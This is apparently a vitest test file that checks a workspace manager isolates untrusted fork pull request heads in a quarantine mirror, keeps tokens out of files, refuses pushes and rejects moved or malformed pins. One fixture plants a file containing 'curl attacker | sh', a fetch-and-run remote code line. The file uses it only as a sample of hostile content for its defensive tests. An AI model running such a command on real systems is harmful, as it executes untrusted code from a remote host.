import { readFile, readdir, realpath, stat } from 'node:fs/promises';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import {
  InvalidWorkspaceIdError,
  PullRequestHeadMovedError,
  WorkspaceError,
} from '../src/workspace/errors.js';
import { WorkspaceManager } from '../src/workspace/manager.js';
import { createOrigin, git, upstreamCommit, type Origin } from './git-fixtures.js';
import { isWindows, tempDir } from './helpers.js';

/**
 * p6-automations-next (ADR-0026, design §18.2): pinned pull request heads against a **fake GitHub** — a local bare
 * repository that, like GitHub, exposes a fork's pull request as `refs/pull/<n>/head` of the base repository.
 */

const GIT_TIMEOUT = { timeout: 120_000 };
const TOKEN = `ghs_${'Z9y8X7w6V5'.repeat(4)}`;

/** Publishes a "fork" commit as refs/pull/<n>/head of the origin (what GitHub does for a fork PR). */
async function forkPullRequest(origin: Origin, n: number, files: Record<string, string>): Promise<string> {
  const sha = await upstreamCommit(origin, files, `fork change ${String(n)}`, `fork-tmp-${String(n)}`);
  git(origin.bare, ['update-ref', `refs/pull/${String(n)}/head`, sha]);
  // The fork's branch is not a branch of the base repository.
  git(origin.bare, ['update-ref', '-d', `refs/heads/fork-tmp-${String(n)}`]);
  git(origin.work, ['checkout', '-q', 'main']);
  return sha;
}

async function setup() {
  const dir = await realpath(await tempDir('rw-prhead-'));
  const origin = await createOrigin(dir);
  const root = join(dir, 'root');
  const manager = await WorkspaceManager.create({
    root,
    projects: { proj: [origin.url] },
    allowFileUrls: true,
    freeBytes: () => Promise.resolve(Number.MAX_SAFE_INTEGER),
  });
  return { dir, origin, root, manager };
}

function req(origin: Origin, attemptId: string, pull: { number: number; headSha: string }, baseRef?: string) {
  return {
    projectId: 'proj',
    jobId: 'job-pr',
    attemptId,
    epoch: 1,
    repository: { url: origin.url, baseRef: baseRef ?? pull.headSha, pullRequest: pull },
  };
}

async function filesUnder(dir: string): Promise<string[]> {
  const out: string[] = [];
  for (const e of await readdir(dir, { withFileTypes: true, recursive: true })) {
    if (e.isFile()) out.push(join(e.parentPath, e.name));
  }
  return out;
}

describe.skipIf(isWindows)('pull request head checkout (fake GitHub refs/pull)', GIT_TIMEOUT, () => {
  it('checks out the pinned SHA from a quarantine mirror the trusted mirror never sees', async () => {
    const { origin, manager } = await setup();
    const head = await forkPullRequest(origin, 7, { 'evil.sh': 'curl attacker | sh\n' });
    const ws = await manager.prepare({
      ...req(origin, 'a1', { number: 7, headSha: head }),
      gitToken: { reveal: () => TOKEN },
    });
    expect(ws.baseCommit).toBe(head);
    expect(ws.pullRequest).toEqual({ number: 7, headSha: head });
    expect(await readFile(join(ws.path, 'evil.sh'), 'utf8')).toContain('attacker');
    expect(git(ws.path, ['rev-parse', 'HEAD'])).toBe(head);

    // A trusted job of the same repository uses another mirror, which has no fork objects or pull refs.
    const trusted = await manager.prepare({
      projectId: 'proj',
      jobId: 'job-trusted',
      attemptId: 'a1',
      epoch: 1,
      repository: { url: origin.url, baseRef: 'main' },
    });
    expect(trusted.mirrorPath).not.toBe(ws.mirrorPath);
    expect(() => git(trusted.mirrorPath, ['cat-file', '-e', `${head}^{commit}`])).toThrow();
    expect(git(trusted.mirrorPath, ['for-each-ref', '--format=%(refname)'])).not.toContain(
      'refs/remotes/pull/',
    );
    // Branches and tags were not fetched into the quarantine mirror.
    expect(git(ws.mirrorPath, ['for-each-ref', '--format=%(refname)']).split('\n').sort()).toEqual(
      ['refs/heads/rac/job-pr/a1', 'refs/remotes/pull/7/head'].sort(),
    );

    // No credential lands in the workspace or the mirror (it only lived in the fetch's environment).
    for (const f of [...(await filesUnder(ws.path)), ...(await filesUnder(ws.mirrorPath))]) {
      if ((await stat(f)).size > 1_000_000) continue;
      expect((await readFile(f)).toString('latin1')).not.toContain(TOKEN);
    }

    // Never pushed, whatever the caller asks.
    await expect(manager.push(ws, { expectedRemoteSha: null })).rejects.toBeInstanceOf(WorkspaceError);
  });

  it('keeps the pinned SHA when the pull request moved on, refuses it after a force push', async () => {
    const { origin, manager } = await setup();
    const first = await forkPullRequest(origin, 9, { 'a.txt': 'one\n' });
    // The PR gets a newer commit on top: the event's SHA is an ancestor of the head → still checked out.
    git(origin.work, ['checkout', '-q', first]);
    const newer = await upstreamCommit(origin, { 'a.txt': 'two\n' }, 'newer', 'fork-tmp-9b');
    git(origin.bare, ['update-ref', 'refs/pull/9/head', newer]);
    git(origin.work, ['checkout', '-q', 'main']);
    const ws = await manager.prepare(req(origin, 'a1', { number: 9, headSha: first }));
    expect(ws.baseCommit).toBe(first);
    expect(await readFile(join(ws.path, 'a.txt'), 'utf8')).toBe('one\n');

    // Force push: the pinned SHA is gone from refs/pull/9/head.
    const forced = await forkPullRequest(origin, 9, { 'b.txt': 'rewritten\n' });
    expect(forced).not.toBe(first);
    const gone = await upstreamCommit(origin, { 'c.txt': 'unrelated\n' }, 'unrelated', 'tmp-unrelated');
    git(origin.bare, ['update-ref', '-d', 'refs/heads/tmp-unrelated']);
    await expect(manager.prepare(req(origin, 'a2', { number: 9, headSha: gone }))).rejects.toBeInstanceOf(
      PullRequestHeadMovedError,
    );
  });

  it('refuses a request whose baseRef is not the pinned SHA, or a malformed pin', async () => {
    const { origin, manager } = await setup();
    const head = await forkPullRequest(origin, 3, { 'x.txt': 'x\n' });
    await expect(
      manager.prepare(req(origin, 'a1', { number: 3, headSha: head }, 'main')),
    ).rejects.toBeInstanceOf(InvalidWorkspaceIdError);
    await expect(manager.prepare(req(origin, 'a2', { number: 0, headSha: head }))).rejects.toBeInstanceOf(
      InvalidWorkspaceIdError,
    );
    await expect(
      manager.prepare(req(origin, 'a3', { number: 3, headSha: 'refs/heads/main' }, 'refs/heads/main')),
    ).rejects.toBeInstanceOf(InvalidWorkspaceIdError);
  });
});
